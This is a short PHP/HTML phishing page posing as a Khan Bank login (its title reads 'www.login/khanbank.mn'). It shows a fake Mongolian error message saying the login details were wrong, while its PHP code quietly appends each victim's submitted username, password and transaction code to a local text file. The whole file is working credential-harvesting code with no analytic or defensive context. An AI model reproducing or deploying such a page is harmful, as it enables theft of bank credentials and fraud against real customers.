<title>www.login/khanbank.mn</title>
<body bgcolor="">
	<body text="">
		
<h1></h1>
      <br>
      	<br>
      	<br>
      	<br>
      	<h1></h1>
      <br>
<?
 
echo "<h1>Буруу байна гүйлгээний код, нууц үг, нэвтрэх нэр, шалгануу та зөв хийн үү ! дахин хандануу баярлалаа !</h1>";

$handle = fopen("76.txt" ,  "a");
fwrite($handle, $_POST["ner"]);
fwrite($handle, " : ");
fwrite($handle, $_POST["nuutsug"]);
fwrite($handle, " : ");
fwrite($handle, $_POST["cod"]);
fwrite($handle, "\n");




?>